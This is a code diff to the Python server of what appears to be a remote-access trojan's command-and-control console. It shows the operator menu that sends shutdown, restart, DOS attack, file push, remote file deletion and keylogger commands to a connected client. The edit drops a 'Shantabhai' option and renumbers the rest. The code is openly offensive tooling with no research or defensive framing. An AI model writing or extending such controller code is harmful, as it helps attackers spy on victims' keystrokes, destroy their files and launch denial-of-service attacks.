@@ -19,7 +19,7 @@ def start_server():
         while True:
             try:
                 print("Waiting for command...")
-                choice = input("1. Shutdown\n2. Restart\n3. DOS Attack\n4. Shantabhai\n5. Send File\n6. Remove File\n7. Keylogger\n8. Exit\nEnter your choice: ")
+                choice = input("1. Shutdown\n2. Restart\n3. DOS Attack\n4. Send File\n5. Remove File\n6. Keylogger\n7. Exit\nEnter your choice: ")
                 
                 if choice == "1":
                     conn.sendall("1".encode())
@@ -32,9 +32,6 @@ def start_server():
                     print("DOS Attack command sent.")
                 elif choice == "4":
                     conn.sendall("4".encode())
-                    print("Shantabhai command sent.")
-                elif choice == "5":
-                    conn.sendall("5".encode())
                     file_path = input("Enter the file path to send: ")
                     
                     if os.path.exists(file_path):
@@ -54,16 +51,16 @@ def start_server():
                             print("Client not ready for file transfer.\n")
                     else:
                         print("File not found!\n")
-                elif choice == "6":
-                    conn.sendall("6".encode())
+                elif choice == "5":
+                    conn.sendall("5".encode())
                     file_path = input("Enter the file path to remove on client: ")
                     conn.sendall(file_path.encode())
                     print(f"Remove file command sent for file {file_path}.")
+                elif choice == "6":
+                    conn.sendall("6".encode())
+                    print("Keylogger command sent.")
                 elif choice == "7":
                     conn.sendall("7".encode())
-                    print("Keylogger command sent.")
-                elif choice == "8":
-                    conn.sendall("8".encode())
                     print("Exit command sent.")
                     break
                 else:
